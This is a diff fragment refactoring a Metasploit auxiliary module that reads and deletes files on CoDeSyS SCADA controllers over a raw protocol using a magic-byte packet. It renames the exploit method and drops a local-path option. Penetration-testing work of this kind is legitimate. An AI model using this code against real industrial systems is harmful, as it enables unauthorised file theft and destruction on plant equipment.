@@ -54,16 +54,12 @@ class Metasploit3 < Msf::Auxiliary
 		return Exploit::CheckCode::Vulnerable
 	end
 
-	def read_file(filepath, filename, localpath)
+	def read_file(filepath, filename)
 		magic_code = "\xdd\xdd"
 		remote_file = nil
 
 		if filepath == nil
 			filepath = ""
-		end
-
-		if localpath[-1, 1] != '/'
-			localpath << '/'
 		end
 
 		pkt = magic_code << "AAAAAAAAAAAA" << [0x100].pack("L")
@@ -85,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		if remote_file != nil
 			# trim 14 chars since that is part of the SCADA response, this allows to retrieve valid binaries
-			f = store_loot(filename, "text/plain", session, remote_file[14..-1], filename, "S3 CoDeSyS file extracted")
+			f = store_loot(filename, "text/plain", nil, remote_file[14..-1], filename, "S3 CoDeSyS file extracted")
 			print_good("Saved remote file: #{f.to_s}")
 		end
 	end
@@ -115,16 +111,12 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	def exploit
+	def run
 		print_status("Attempting to communicate with SCADA system #{rhost} on port #{rport}")
 		case datastore['ACTION']
 		when 'READ'
 			print_status("Attempting to read file #{datastore['FILEPATH']}#{datastore['FILENAME']}")
-			if datastore['LOCALPATH'] == nil
-				print_error("You must set LOCALPATH")
-				return
-			end
-			read_file(datastore['FILEPATH'], datastore['FILENAME'], datastore['LOCALPATH'])
+			read_file(datastore['FILEPATH'], datastore['FILENAME'])
 		when 'DELETE'
 			print_status("Attempting to delete file #{datastore['FILENAME']}")
 			delete_file(datastore['FILEPATH'], datastore['FILENAME'])
